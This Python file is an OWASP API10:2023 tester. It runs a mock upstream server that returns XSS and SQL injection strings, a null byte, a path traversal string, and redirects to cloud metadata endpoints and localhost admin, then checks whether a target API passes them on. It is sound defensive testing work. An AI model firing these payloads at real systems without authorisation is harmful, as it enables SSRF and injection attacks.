#!/usr/bin/env python3
"""OWASP API10:2023 — Unsafe Consumption of Third-Party APIs tester."""
import argparse
import json
import sys
import threading
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer

VERIFY_TLS = __import__('os').environ.get("SKIP_TLS_VERIFY", "").lower() not in ("1", "true", "yes")
SEVERITY_WEIGHTS = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}

UPSTREAM_PAYLOADS = {
    "/xss":          (200, {"Content-Type": "application/json"},
                     json.dumps({"data": "<script>alert('xss')</script>", "name": "<img src=x onerror=alert(1)>"})),
    "/sqli":         (200, {"Content-Type": "application/json"},
                     json.dumps({"name": "' OR '1'='1", "id": "1; DROP TABLE users--"})),
    "/redirect":     (302, {"Location": "http://169.254.169.254/latest/meta-data/"}, ""),
    "/gcp-redirect": (302, {"Location": "http://metadata.google.internal/computeMetadata/v1/"}, ""),
    "/localhost":    (302, {"Location": "http://localhost/admin"}, ""),
    "/oversized":    (200, {"Content-Type": "application/json"},
                     json.dumps({"data": "A" * (1024 * 1024)})),
    "/type-confusion": (200, {"Content-Type": "application/json"},
                     json.dumps({"count": "not-a-number", "active": "yes", "price": None})),
    "/credential-leak": (200, {"Content-Type": "application/json"},
                     json.dumps({"api_key": "sk-prod-ABC123XYZ", "db_password": "P@ssw0rd!",
                                 "internal_url": "http://db.internal:5432"})),
    "/null-byte":    (200, {"Content-Type": "application/json"},
                     json.dumps({"name": "valid\x00injected", "path": "../../etc/passwd"})),
}


class MockUpstreamHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self._respond()

    def do_POST(self):
        self._respond()

    def _respond(self):
        payload = UPSTREAM_PAYLOADS.get(self.path)
        if payload is None:
            self.send_response(404)
            self.end_headers()
            return
        status, extra_headers, body = payload
        self.send_response(status)
        for k, v in extra_headers.items():
            self.send_header(k, v)
        self.end_headers()
        if body:
            self.wfile.write(body.encode())

    def log_message(self, *args):
        pass


def start_mock_server(port):
    server = HTTPServer(("127.0.0.1", port), MockUpstreamHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    time.sleep(0.3)
    return server


def make_request(url, token=None, method="POST", data=None):
    headers = {"Content-Type": "application/json", "User-Agent": "SecurityAssessment/1.0"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = json.dumps(data).encode() if data else b""
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        ctx = None
        if not VERIFY_TLS:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), ""
    except Exception:
        return 0, {}, ""


def probe_upstream_injection(base_url, mock_url, path, token, test_name, severity_if_propagated):
    upstream = mock_url.rstrip("/") + path
    _, _, mock_body = UPSTREAM_PAYLOADS.get(path, (None, None, "{}"))

    status, _, response = make_request(
        base_url.rstrip("/") + "/api/preview",
        token=token,
        data={"url": upstream, "source": upstream, "webhook": upstream, "callback": upstream},
    )

    propagated = False
    if mock_body and len(mock_body) > 2:
        try:
            payload_values = list(json.loads(mock_body).values())
            propagated = any(str(v) in response for v in payload_values if v)
        except Exception:
            propagated = mock_body[:50] in response

    finding = {
        "test": test_name,
        "mock_endpoint": path,
        "upstream_url_sent": upstream,
        "http_status": status,
        "propagated_in_response": propagated,
    }

    if propagated:
        finding["severity"] = severity_if_propagated
        finding["detail"] = f"Upstream payload propagated to API response without sanitization"
    else:
        finding["severity"] = "INFO"
        finding["detail"] = "Upstream payload not detected in response"

    return finding


def probe_ssrf_redirect(base_url, mock_url, path, internal_target, token):
    upstream = mock_url.rstrip("/") + path
    status, _, response = make_request(
        base_url.rstrip("/") + "/api/preview",
        token=token,
        data={"url": upstream},
    )

    # Heuristic: if response contains metadata-like content or internal IP patterns
    internal_indicators = ["ami-id", "instance-id", "computeMetadata", "admin", "169.254"]
    followed = any(ind in response for ind in internal_indicators)

    return {
        "test": "ssrf_via_upstream_redirect",
        "mock_redirect_path": path,
        "internal_target": internal_target,
        "http_status": status,
        "followed_redirect": followed,
        "internal_content_returned": followed,
        "severity": "CRITICAL" if followed else "MEDIUM",
        "detail": (
            f"API followed upstream redirect to {internal_target} — internal content returned"
            if followed else
            f"Redirect to {internal_target} — response did not contain internal content (may still be vulnerable)"
        ),
    }


def probe_type_confusion(base_url, mock_url, token):
    upstream = mock_url.rstrip("/") + "/type-confusion"
    status, _, response = make_request(
        base_url.rstrip("/") + "/api/data",
        token=token,
        data={"source": upstream},
    )
    return {
        "test": "type_confusion_via_upstream",
        "mock_endpoint": "/type-confusion",
        "http_status": status,
        "severity": "MEDIUM",
        "detail": "Upstream response with wrong types sent — verify target validates schema before use",
    }


def probe_credential_leak(base_url, mock_url, token):
    upstream = mock_url.rstrip("/") + "/credential-leak"
    _, _, mock_body = UPSTREAM_PAYLOADS["/credential-leak"]
    status, _, response = make_request(
        base_url.rstrip("/") + "/api/preview",
        token=token,
        data={"url": upstream},
    )
    leaked = any(v in response for v in ["sk-prod-ABC123XYZ", "P@ssw0rd!", "db.internal"])
    return {
        "test": "credential_leakage_via_proxied_response",
        "mock_endpoint": "/credential-leak",
        "http_status": status,
        "credentials_leaked_to_client": leaked,
        "severity": "CRITICAL" if leaked else "INFO",
        "detail": (
            "Upstream API credentials and internal URLs forwarded to API client"
            if leaked else "Upstream credentials not detected in response"
        ),
    }


def main():
    parser = argparse.ArgumentParser(description="OWASP API10:2023 — Unsafe Consumption of APIs tester")
    parser.add_argument("--target-url", required=True, help="Base URL of the target API")
    parser.add_argument("--upstream-url", default=None,
                        help="Override mock upstream URL (default: start local mock on --mock-port)")
    parser.add_argument("--mock-port", type=int, default=9876, help="Local port for mock upstream server")
    parser.add_argument("--token", default=None, help="Bearer token for authentication")
    parser.add_argument("--output", default="api10_report.json", help="Output JSON report file")
    args = parser.parse_args()

    if args.upstream_url:
        mock_url = args.upstream_url
        server = None
    else:
        server = start_mock_server(args.mock_port)
        mock_url = f"http://127.0.0.1:{args.mock_port}"

    findings = []
    start_time = datetime.now(timezone.utc)

    findings.append(probe_upstream_injection(
        args.target_url, mock_url, "/xss", args.token,
        "xss_injection_via_upstream_response", "HIGH"))

    findings.append(probe_upstream_injection(
        args.target_url, mock_url, "/sqli", args.token,
        "sql_injection_via_upstream_response", "CRITICAL"))

    findings.append(probe_ssrf_redirect(
        args.target_url, mock_url, "/redirect", "http://169.254.169.254/latest/meta-data/", args.token))

    findings.append(probe_ssrf_redirect(
        args.target_url, mock_url, "/localhost", "http://localhost/admin", args.token))

    findings.append(probe_upstream_injection(
        args.target_url, mock_url, "/null-byte", args.token,
        "null_byte_injection_via_upstream", "HIGH"))

    findings.append(probe_type_confusion(args.target_url, mock_url, args.token))
    findings.append(probe_credential_leak(args.target_url, mock_url, args.token))

    if server:
        server.shutdown()

    max_sev = max((SEVERITY_WEIGHTS.get(f["severity"], 0) for f in findings), default=0)
    sev_names = {v: k for k, v in SEVERITY_WEIGHTS.items()}
    overall_risk = sev_names.get(max_sev, "PASS")

    report = {
        "methodology": "OWASP API10:2023 — Unsafe Consumption of APIs — testing-api-for-unsafe-consumption v1.0",
        "assessment_timestamp": start_time.isoformat(),
        "target_url": args.target_url,
        "mock_server": mock_url,
        "tests_run": len(findings),
        "findings": findings,
        "overall_risk": overall_risk,
        "recommendation": (
            "Validate and sanitize all data received from upstream APIs before use. "
            "Block redirect following to private/loopback/cloud-metadata IP ranges. "
            "Enforce strict JSON schema validation on upstream responses. "
            "Never proxy raw upstream responses to clients without filtering."
        ),
    }

    print(json.dumps(report, indent=2))
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)

    if overall_risk in ("CRITICAL", "HIGH"):
        sys.exit(1)


if __name__ == "__main__":
    main()
